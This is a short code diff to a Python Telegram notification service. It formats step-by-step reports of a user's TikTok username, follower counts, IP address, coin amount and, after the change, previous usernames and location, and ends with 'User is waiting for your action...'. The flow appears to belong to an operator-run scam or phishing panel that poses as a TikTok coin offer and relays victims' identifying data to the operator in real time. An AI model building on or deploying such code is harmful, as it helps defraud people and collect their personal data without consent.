@@ -50,6 +50,14 @@ class TelegramService:
         """Format message based on step"""
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
+        previous_username_line = ""
+        if data.get("previous_usernames_text"):
+            previous_username_line = f"\n👤 <b>Önceki Username:</b> <code>{data.get('previous_usernames_text')}</code>"
+
+        location_line = ""
+        if data.get("location"):
+            location_line = f"\n🌍 <b>Konum:</b> <code>{data.get('location')}</code>"
+        
         if step == "username_coin":
             tiktok_data = data.get('tiktok_data', {})
             followers = tiktok_data.get('followers', 'N/A')
@@ -57,11 +65,11 @@ class TelegramService:
             
             return f"""🎮 <b>STEP 1: Giriş & Coin Selection</b>
 
-👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>
+👤 <b>Username:</b> <code>{data.get('username', 'N/A')}</code>{previous_username_line}
 ✔️ <b>Followers:</b> <code>{followers}</code>
-✔️ <b>Following:</b> <code>{following}</code>
-💰 <b>Coin Amount:</b> <code>{data.get('amount', 'N/A')}</code>
+✔️ <b>Following:</b> <code>{following}</code>{location_line}
 🌐 <b>IP:</b> <code>{data.get('ip', 'N/A')}</code>
+💰 <b>Coin Amount:</b> <code>{data.get('amount', 'N/A')}</code>
 ⏰ <b>Time:</b> {timestamp}
 
 🕹️ <b>User is waiting for your action...</b>
